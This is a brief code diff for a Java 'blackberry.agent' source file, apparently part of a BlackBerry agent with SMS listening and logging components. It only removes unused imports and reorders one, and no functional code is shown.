@@ -9,9 +9,7 @@
  * *************************************************/
 package blackberry.agent;
 
-import java.io.IOException;
 import java.util.Date;
-import java.util.Hashtable;
 import java.util.Vector;
 
 import net.rim.device.api.util.IntHashtable;
@@ -23,12 +21,10 @@ import blackberry.agent.sms.SmsListener;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.log.TimestampMarkup;
 import blackberry.log.Log;
 import blackberry.log.LogType;
-import blackberry.log.Markup;
+import blackberry.log.TimestampMarkup;
 import blackberry.utils.Check;
-import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
